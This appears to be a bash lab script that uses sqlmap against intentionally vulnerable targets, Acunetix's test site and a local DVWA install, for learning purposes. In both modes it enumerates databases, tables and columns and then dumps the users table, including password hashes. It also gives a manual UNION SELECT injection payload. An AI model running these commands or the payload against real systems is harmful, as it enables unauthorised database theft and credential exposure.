#!/usr/bin/env bash
# =============================================================================
#  sqlmap lab runner
#
#  Usage:
#    bash sqlmap_lab.sh web              # attack testphp.vulnweb.com (no login)
#    bash sqlmap_lab.sh dvwa <PHPSESSID> # attack your local DVWA (needs cookie)
#
#  Where to get PHPSESSID:
#    Open DVWA in the browser -> F12 -> Application/Storage -> Cookies
#    -> http://localhost -> copy the value of PHPSESSID
# =============================================================================
set -uo pipefail

GREEN='\033[0;32m'; RED='\033[0;31m'; YEL='\033[1;33m'; NC='\033[0m'
info() { echo -e "${GREEN}[+]${NC} $*"; }
die()  { echo -e "${RED}[-]${NC} $*"; exit 1; }

command -v sqlmap >/dev/null 2>&1 || die "sqlmap not found. Install it:  sudo apt install sqlmap -y"

OUTDIR="$HOME/dvwa_lab_output"
mkdir -p "$OUTDIR"

MODE="${1:-}"
case "$MODE" in

# ---------------------------------------------------------------- WEB TARGET
web)
    URL='http://testphp.vulnweb.com/listproducts.php?cat=1'
    info "Target: $URL   (intentionally vulnerable Acunetix test site)"

    info "STEP 1/4 - list databases"
    sqlmap -u "$URL" --dbs --batch --output-dir="$OUTDIR/web"

    info "STEP 2/4 - list tables in 'acuart'"
    sqlmap -u "$URL" -D acuart --tables --batch --output-dir="$OUTDIR/web"

    info "STEP 3/4 - list columns of 'users'"
    sqlmap -u "$URL" -D acuart -T users --columns --batch --output-dir="$OUTDIR/web"

    info "STEP 4/4 - dump 'users'"
    sqlmap -u "$URL" -D acuart -T users --dump --batch --output-dir="$OUTDIR/web"

    echo
    info "Saved logs + dumped CSV in: $OUTDIR/web"
    ;;

# ---------------------------------------------------------------- LOCAL DVWA
dvwa)
    SID="${2:-}"
    [ -n "$SID" ] || die "Usage: bash sqlmap_lab.sh dvwa <PHPSESSID>   (get it from F12 -> Cookies)"
    LVL="${3:-low}"
    URL='http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit'
    COOKIE="PHPSESSID=${SID}; security=${LVL}"

    info "Target: $URL  (security=$LVL)"

    info "STEP 1/4 - list databases"
    sqlmap -u "$URL" --cookie="$COOKIE" --dbs --batch --output-dir="$OUTDIR/dvwa"

    info "STEP 2/4 - list tables in 'dvwa'"
    sqlmap -u "$URL" --cookie="$COOKIE" -D dvwa --tables --batch --output-dir="$OUTDIR/dvwa"

    info "STEP 3/4 - list columns of 'users'"
    sqlmap -u "$URL" --cookie="$COOKIE" -D dvwa -T users --columns --batch --output-dir="$OUTDIR/dvwa"

    info "STEP 4/4 - dump user/password"
    sqlmap -u "$URL" --cookie="$COOKIE" -D dvwa -T users -C user,password --dump --batch --output-dir="$OUTDIR/dvwa"

    echo
    info "Saved logs in: $OUTDIR/dvwa"
    info "Tip: DVWA stores the password as an MD5 hash. The manual payload"
    info "     ' UNION SELECT user, password FROM users #  in the browser shows the same data."
    ;;

*)
    echo "Usage:"
    echo "  bash sqlmap_lab.sh web"
    echo "  bash sqlmap_lab.sh dvwa <PHPSESSID> [security_level]"
    echo
    echo "Example:"
    echo "  bash sqlmap_lab.sh dvwa 4f2c9a8b7d6e5f4a3b2c1d0e9f8a7b6c low"
    exit 1
    ;;
esac
